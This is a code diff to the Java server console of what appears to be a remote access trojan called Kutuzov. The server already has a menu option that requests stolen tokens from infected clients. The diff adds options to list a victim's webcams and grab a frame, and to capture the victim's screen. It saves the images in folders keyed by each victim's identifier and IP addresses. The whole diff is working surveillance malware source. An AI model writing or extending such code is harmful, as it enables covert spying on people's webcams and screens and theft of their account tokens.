@@ -3,18 +3,22 @@ package me.kutuzov.server;
 import com.google.gson.Gson;
 import com.google.gson.JsonObject;
 import com.google.gson.stream.JsonReader;
+import com.sun.imageio.plugins.common.ImageUtil;
+import jdk.nashorn.internal.ir.annotations.Ignore;
 import me.kutuzov.packet.*;
 import me.kutuzov.packet.bukkit.*;
-import me.kutuzov.packet.logger.CSTokenResponse;
-import me.kutuzov.packet.logger.SCTokenRequest;
+import me.kutuzov.packet.logger.*;
 import me.kutuzov.packet.logger.types.TokenType;
 import me.kutuzov.server.client.Client;
 import me.kutuzov.server.client.ClientManager;
 import me.kutuzov.server.kftp.KFTPPanel;
 import me.kutuzov.server.util.LoadingWheel;
+import me.kutuzov.utils.ImageUtils;
 import me.pk2.moodlyencryption.MoodlyEncryption;
 
+import javax.imageio.ImageIO;
 import java.awt.*;
+import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.ServerSocket;
 import java.net.Socket;
@@ -334,6 +338,12 @@ public class KutuzovServer {
         int option = input.contentEquals("")?-1:Integer.parseInt(input);
         clearConsole();
 
+        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("d-M-yyyy_HH-mm-ss");
+        String date = LocalDateTime.now().format(formatter);
+
+        File file = new File("captures/" + client.getIdentifierName() + "/" + client.getIp().split(":")[0] + "_" + client.getLocalIp() + "/" + date + ".png");
+        file.getParentFile().mkdirs();
+
         switch (option) {
             case 1: {
                 try {
@@ -353,6 +363,91 @@ public class KutuzovServer {
                 pnl("Received token(s)<" + response.tokens.length + ">:");
                 for(int i = 0; i < response.tokens.length; i++)
                     pnl("  - " + response.tokens[i]);
+                pnl("Press any key to continue.");
+                readLine();
+            } break;
+
+            case 2: {
+                try {
+                    client.sendPacket(new SCWebcamList());
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    pnl("Could not send SCWebcamList packet.");
+
+                    trySleep(5000);
+                }
+
+                pnl("Waiting for CSWebcamList...");
+
+                CSWebcamList list = (CSWebcamList) client.readPacket();
+                pnl("Received webcam list with " + list.webcamNames.length + " webcams.");
+                pnl("Please select a webcam: ");
+                for(int i = 0; i < list.webcamNames.length; i++)
+                    pnl("  " + i + ") " + list.webcamNames[i]);
+
+                pwl("Webcam: ");
+                int webcam = Integer.parseInt(readLine());
+                pnl("Selected webcam: " + list.webcamNames[webcam]);
+
+                try {
+                    client.sendPacket(new SCWebcamFrame(webcam));
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    pnl("Could not send SCWebcamFrame packet.");
+
+                    trySleep(5000);
+                }
+
+                pnl("Waiting for CSWebcamFrame...");
+
+                CSWebcamFrame frame = (CSWebcamFrame) client.readPacket();
+                pnl("Received frame with size " + frame.bytes.length + " bytes.");
+                pnl("Converting to image...");
+
+                try {
+                    BufferedImage image = ImageUtils.toBufferedImage(frame.bytes);
+                    ImageIO.write(image, "png", file);
+
+                    pnl("Image saved to \"" + file.getAbsolutePath() + "\".");
+                } catch (IOException e) {
+                    e.printStackTrace();
+                    pnl("Could not convert frame to image.");
+
+                    trySleep(5000);
+                }
+
+                pnl("Press any key to continue.");
+                readLine();
+            } break;
+
+            case 3: {
+                try {
+                    client.sendPacket(new SCScreenFrame());
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    pnl("Could not send SCScreenFrame packet.");
+
+                    trySleep(5000);
+                }
+
+                pnl("Waiting for CSScreenFrame...");
+
+                CSScreenFrame frame = (CSScreenFrame) client.readPacket();
+                pnl("Received frame with size " + frame.data.length + " bytes.");
+                pnl("Converting to image...");
+
+                try {
+                    BufferedImage image = ImageUtils.toBufferedImage(frame.data);
+                    ImageIO.write(image, "png", file);
+
+                    pnl("Image saved to \"" + file.getAbsolutePath() + "\".");
+                } catch (IOException e) {
+                    e.printStackTrace();
+                    pnl("Could not convert frame to image.");
+
+                    trySleep(5000);
+                }
+
                 pnl("Press any key to continue.");
                 readLine();
             } break;
